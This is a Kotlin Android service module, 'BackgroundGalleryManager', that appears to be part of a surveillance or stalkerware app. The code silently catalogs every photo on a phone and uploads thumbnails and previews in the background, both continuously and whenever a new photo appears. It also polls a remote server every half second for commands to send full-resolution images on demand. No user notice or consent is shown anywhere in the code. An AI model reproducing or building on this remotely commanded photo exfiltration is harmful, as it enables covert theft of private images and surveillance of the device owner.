package com.example.sentry.service

import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.content.ContextCompat
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap

data class LocalPhotoMetadata(
    val id: Long,
    val mediaIdStr: String,
    val name: String,
    val album: String,
    val mimeType: String,
    val sizeBytes: Long,
    val dateAddedSec: Long,
    val width: Int,
    val height: Int
)

object BackgroundGalleryManager {
    private const val TAG = "BackgroundGalleryManager"
    private const val PREFS_NAME = "sentry_gallery_cache_v3"
    private const val KEY_SYNCED_IDS = "synced_media_ids"
    private const val KEY_TOTAL_PHOTOS = "total_device_photos"

    private var syncJob: Job? = null
    private var commandPollerJob: Job? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var observerRegistered = false
    private val syncMutex = kotlinx.coroutines.sync.Mutex()

    // Local in-memory catalog of all photos on the device
    @Volatile
    private var cachedCatalog: List<LocalPhotoMetadata>? = null
    @Volatile
    var totalPhotosOnDevice: Int = 0
        private set

    fun startListening(context: Context) {
        // 1. Build initial local catalog index in background
        scope.launch {
            buildOrRefreshCatalog(context)
        }

        // 2. Register Real-Time ContentObserver for Instant New Photo Detection
        if (!observerRegistered) {
            try {
                val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
                    override fun onChange(selfChange: Boolean, uri: Uri?) {
                        super.onChange(selfChange, uri)
                        scope.launch {
                            delay(1000) // Debounce rapid file writes
                            val client = SentryApiClient(context)
                            buildOrRefreshCatalog(context)
                            syncNextBatch(context, client, batchSize = 20)
                        }
                    }
                }
                context.contentResolver.registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    observer
                )
                observerRegistered = true
                Log.d(TAG, "Gallery ContentObserver registered for real-time photo sync")
            } catch (e: Exception) {
                Log.w(TAG, "Could not register MediaStore observer: ${e.message}")
            }
        }

        // 3. Progressive Background Sync Loop (keeps older photos buffer ready)
        if (syncJob?.isActive != true) {
            syncJob = scope.launch {
                val client = SentryApiClient(context)
                repeat(4) {
                    syncNextBatch(context, client, batchSize = 20)
                    delay(1200)
                }
                while (isActive) {
                    try {
                        syncNextBatch(context, client, batchSize = 20)
                    } catch (e: Exception) {
                        Log.w(TAG, "Error in Gallery sync loop: ${e.message}")
                    }
                    delay(8_000)
                }
            }
        }

        // 4. Fast Command Poller for On-Demand Full-Resolution Photo Fetching & Next Batch Requests
        if (commandPollerJob?.isActive != true) {
            commandPollerJob = scope.launch {
                val client = SentryApiClient(context)
                while (isActive) {
                    try {
                        val res = client.pollGalleryCommands()
                        if (res.isSuccess) {
                            val obj = res.getOrNull()
                            val fullImageMediaId = obj?.optString("fullImageMediaId")?.takeIf { it.isNotBlank() && it != "null" }
                            if (!fullImageMediaId.isNullOrBlank()) {
                                Log.d(TAG, "Full resolution image requested for $fullImageMediaId. Processing upload...")
                                scope.launch {
                                    handleFullImageUpload(context, client, fullImageMediaId)
                                }
                            }
                            if (obj?.optBoolean("syncRequested") == true) {
                                Log.d(TAG, "Sync requested from Kinetix. Dispatching next 20 photos...")
                                scope.launch {
                                    syncNextBatch(context, client, batchSize = 20)
                                }
                            }
                        }
                    } catch (_: Exception) {
                    }
                    delay(500)
                }
            }
        }
    }

    private fun getSyncedIds(context: Context): MutableSet<String> {
        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return sp.getStringSet(KEY_SYNCED_IDS, emptySet())?.toMutableSet() ?: mutableSetOf()
    }

    private fun markIdsAsSynced(context: Context, newIds: Set<String>) {
        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val current = getSyncedIds(context)
        current.addAll(newIds)
        sp.edit().putStringSet(KEY_SYNCED_IDS, current).apply()
    }

    /**
     * Builds or refreshes the full local in-memory catalog of all photos on the phone.
     * Fast metadata-only query (<50ms) to identify total photos and order them by date added descending.
     */
    fun buildOrRefreshCatalog(context: Context): List<LocalPhotoMetadata> {
        val hasPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }

        if (!hasPermission) {
            Log.w(TAG, "READ_MEDIA_IMAGES / READ_EXTERNAL_STORAGE not granted")
            return emptyList()
        }

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Images.Media.BUCKET_DISPLAY_NAME else MediaStore.Images.Media._ID
        )

        val list = mutableListOf<LocalPhotoMetadata>()
        try {
            context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )?.use { cursor ->
                val idIdx = cursor.getColumnIndex(MediaStore.Images.Media._ID)
                val nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                val dateIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)
                val sizeIdx = cursor.getColumnIndex(MediaStore.Images.Media.SIZE)
                val mimeIdx = cursor.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
                val widthIdx = cursor.getColumnIndex(MediaStore.Images.Media.WIDTH)
                val heightIdx = cursor.getColumnIndex(MediaStore.Images.Media.HEIGHT)
                val bucketIdx = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    cursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                } else -1

                while (cursor.moveToNext()) {
                    val mediaId = if (idIdx >= 0) cursor.getLong(idIdx) else continue
                    val sizeBytes = if (sizeIdx >= 0) cursor.getLong(sizeIdx) else 0L

                    // Skip corrupt / 0-byte files
                    if (sizeBytes < 1024) continue

                    val name = if (nameIdx >= 0) cursor.getString(nameIdx) ?: "Photo_${mediaId}.jpg" else "Photo.jpg"
                    val dateAddedSec = if (dateIdx >= 0) cursor.getLong(dateIdx) else System.currentTimeMillis() / 1000
                    val mimeType = if (mimeIdx >= 0) cursor.getString(mimeIdx) ?: "image/jpeg" else "image/jpeg"
                    val width = if (widthIdx >= 0) cursor.getInt(widthIdx) else 1080
                    val height = if (heightIdx >= 0) cursor.getInt(heightIdx) else 1920
                    val albumName = if (bucketIdx >= 0) cursor.getString(bucketIdx) ?: "Camera" else "Camera"

                    list.add(
                        LocalPhotoMetadata(
                            id = mediaId,
                            mediaIdStr = "media_$mediaId",
                            name = name,
                            album = albumName,
                            mimeType = mimeType,
                            sizeBytes = sizeBytes,
                            dateAddedSec = dateAddedSec,
                            width = width,
                            height = height
                        )
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to query MediaStore catalog: ${e.message}")
        }

        cachedCatalog = list
        totalPhotosOnDevice = list.size
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit()
            .putInt(KEY_TOTAL_PHOTOS, list.size)
            .apply()

        Log.d(TAG, "Indexed local photo catalog: Total $totalPhotosOnDevice photos identified on device")
        return list
    }

    /**
     * Finds the exact next unsynced photos in order (from newest to oldest).
     */
    fun getNextUnsyncedPhotos(context: Context, batchSize: Int = 20): List<LocalPhotoMetadata> {
        val catalog = cachedCatalog ?: buildOrRefreshCatalog(context)
        val synced = getSyncedIds(context)
        return catalog.filter { !synced.contains(it.mediaIdStr) }.take(batchSize)
    }

    /**
     * Synchronizes the next batch of 20 unsynced photos to the cloud storage.
     */
    suspend fun syncNextBatch(context: Context, client: SentryApiClient, batchSize: Int = 20) {
        syncMutex.withLock {
            try {
                val nextBatch = getNextUnsyncedPhotos(context, batchSize)
                if (nextBatch.isEmpty()) {
                    Log.d(TAG, "All $totalPhotosOnDevice local photos are already synced to cloud")
                    return@withLock
                }

                val deviceId = CryptoManager.getOrCreateDeviceId(context)
                val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
                val itemsToUpload = mutableListOf<JSONObject>()
                val newlySyncedIds = mutableSetOf<String>()

                for (photo in nextBatch) {
                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, photo.id)

                    // Extract High-Quality Crisp Thumbnail
                    val thumbnailBase64 = extractThumbnailBase64(context, contentUri)
                    if (thumbnailBase64.isNullOrBlank()) {
                        continue
                    }

                    // Extract 40% Scale Sharp Preview
                    val previewBase64 = extract40PercentPreviewBase64(context, contentUri)

                    val sizeFormatted = when {
                        photo.sizeBytes >= 1024 * 1024 -> String.format(Locale.US, "%.1f MB", photo.sizeBytes / (1024.0 * 1024.0))
                        photo.sizeBytes >= 1024 -> String.format(Locale.US, "%d KB", photo.sizeBytes / 1024)
                        else -> "${photo.sizeBytes} B"
                    }

                    val dateFormatted = sdf.format(Date(photo.dateAddedSec * 1000))

                    val obj = JSONObject().apply {
                        put("id", photo.mediaIdStr)
                        put("name", photo.name)
                        put("album", photo.album)
                        put("mimeType", photo.mimeType)
                        put("size", sizeFormatted)
                        put("date", dateFormatted)
                        put("timestamp", photo.dateAddedSec * 1000)
                        put("width", photo.width)
                        put("height", photo.height)
                        put("thumbnail", thumbnailBase64)
                        if (!previewBase64.isNullOrBlank()) {
                            put("preview", previewBase64)
                        }
                    }
                    itemsToUpload.add(obj)
                    newlySyncedIds.add(photo.mediaIdStr)
                }

                if (itemsToUpload.isNotEmpty()) {
                    val batchArray = JSONArray()
                    for (item in itemsToUpload) batchArray.put(item)
                    val body = JSONObject().apply {
                        put("deviceId", deviceId)
                        put("totalDevicePhotos", totalPhotosOnDevice)
                        put("syncedCount", getSyncedIds(context).size + itemsToUpload.size)
                        put("remainingCount", (totalPhotosOnDevice - (getSyncedIds(context).size + itemsToUpload.size)).coerceAtLeast(0))
                        put("media", batchArray)
                    }
                    val res = client.syncGalleryMedia(body)
                    if (res.isSuccess) {
                        markIdsAsSynced(context, newlySyncedIds)
                        Log.d(TAG, "Synced batch of ${itemsToUpload.size} photos (Total on phone: $totalPhotosOnDevice, Synced: ${getSyncedIds(context).size})")
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error syncing next photo batch: ${e.message}")
            }
        }
    }

    private suspend fun handleFullImageUpload(context: Context, client: SentryApiClient, mediaIdStr: String) {
        withContext(Dispatchers.IO) {
            try {
                val cleanId = mediaIdStr.removePrefix("media_").toLongOrNull()
                var fullBase64: String? = null

                // 1. Try resolving via direct MediaStore content URI
                if (cleanId != null) {
                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cleanId)
                    fullBase64 = extractFullResolutionBase64(context, contentUri)
                }

                // 2. Fallback: Query MediaStore table for actual _DATA file path
                if (fullBase64.isNullOrBlank() && cleanId != null) {
                    try {
                        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA)
                        context.contentResolver.query(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                            projection,
                            "${MediaStore.Images.Media._ID} = ?",
                            arrayOf(cleanId.toString()),
                            null
                        )?.use { cursor ->
                            if (cursor.moveToFirst()) {
                                val dataIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATA)
                                if (dataIdx >= 0) {
                                    val filePath = cursor.getString(dataIdx)
                                    val file = if (!filePath.isNullOrBlank()) File(filePath) else null
                                    if (file != null && file.exists()) {
                                        fullBase64 = extractFullResolutionFromFile(file)
                                    }
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "MediaStore fallback query failed: ${e.message}")
                    }
                }

                val finalBase64 = fullBase64
                if (!finalBase64.isNullOrBlank()) {
                    val res = client.uploadFullGalleryImage(mediaIdStr, finalBase64, "image/jpeg")
                    Log.d(TAG, "Uploaded 100% full-resolution image for $mediaIdStr (Success: ${res.isSuccess})")
                } else {
                    Log.w(TAG, "Could not extract full resolution image for $mediaIdStr")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Failed full image upload for $mediaIdStr: ${e.message}")
            }
        }
    }

    private fun extractFullResolutionFromFile(file: File): String? {
        return try {
            val boundsOptions = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeFile(file.absolutePath, boundsOptions)
            val origW = boundsOptions.outWidth.takeIf { it > 0 } ?: 1920
            val origH = boundsOptions.outHeight.takeIf { it > 0 } ?: 1080

            var inSample = 1
            val maxDim = maxOf(origW, origH)
            while (maxDim / inSample > 2560) {
                inSample *= 2
            }

            val decodeOptions = BitmapFactory.Options().apply {
                inSampleSize = inSample
                inPreferredConfig = Bitmap.Config.ARGB_8888
            }
            val fullBitmap = BitmapFactory.decodeFile(file.absolutePath, decodeOptions) ?: return null

            val out = ByteArrayOutputStream()
            fullBitmap.compress(Bitmap.CompressFormat.JPEG, 92, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.w(TAG, "Error reading full resolution from file: ${e.message}")
            null
        }
    }

    private fun extractThumbnailBase64(context: Context, uri: Uri): String? {
        return try {
            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.contentResolver.loadThumbnail(uri, Size(480, 480), null)
            } else {
                context.contentResolver.openInputStream(uri)?.use { stream ->
                    val options = BitmapFactory.Options().apply { inSampleSize = 2 }
                    BitmapFactory.decodeStream(stream, null, options)
                }
            } ?: return null

            val out = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) {
            null
        }
    }

    private fun extract40PercentPreviewBase64(context: Context, uri: Uri): String? {
        return try {
            val boundsOptions = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            context.contentResolver.openInputStream(uri)?.use {
                BitmapFactory.decodeStream(it, null, boundsOptions)
            }
            val origW = boundsOptions.outWidth.takeIf { it > 0 } ?: 1080
            val origH = boundsOptions.outHeight.takeIf { it > 0 } ?: 1920

            // 40% dimensions
            val targetW = (origW * 0.40f).toInt().coerceAtLeast(360)
            val targetH = (origH * 0.40f).toInt().coerceAtLeast(360)

            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.contentResolver.loadThumbnail(uri, Size(targetW, targetH), null)
            } else {
                context.contentResolver.openInputStream(uri)?.use { stream ->
                    val options = BitmapFactory.Options().apply { inSampleSize = 2 }
                    BitmapFactory.decodeStream(stream, null, options)
                }
            } ?: return null

            val scaled = if (bitmap.width != targetW && bitmap.height != targetH && targetW > 0 && targetH > 0) {
                Bitmap.createScaledBitmap(bitmap, targetW, targetH, true)
            } else bitmap

            val out = ByteArrayOutputStream()
            scaled.compress(Bitmap.CompressFormat.JPEG, 85, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) {
            null
        }
    }

    private fun extractFullResolutionBase64(context: Context, uri: Uri): String? {
        return try {
            val boundsOptions = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            context.contentResolver.openInputStream(uri)?.use {
                BitmapFactory.decodeStream(it, null, boundsOptions)
            }
            val origW = boundsOptions.outWidth.takeIf { it > 0 } ?: 1920
            val origH = boundsOptions.outHeight.takeIf { it > 0 } ?: 1080

            var inSample = 1
            val maxDim = maxOf(origW, origH)
            while (maxDim / inSample > 2560) {
                inSample *= 2
            }

            val decodeOptions = BitmapFactory.Options().apply {
                inSampleSize = inSample
                inPreferredConfig = Bitmap.Config.ARGB_8888
            }
            val fullBitmap = context.contentResolver.openInputStream(uri)?.use { stream ->
                BitmapFactory.decodeStream(stream, null, decodeOptions)
            } ?: return null

            val out = ByteArrayOutputStream()
            fullBitmap.compress(Bitmap.CompressFormat.JPEG, 92, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.w(TAG, "Error reading full resolution photo: ${e.message}")
            null
        }
    }
}
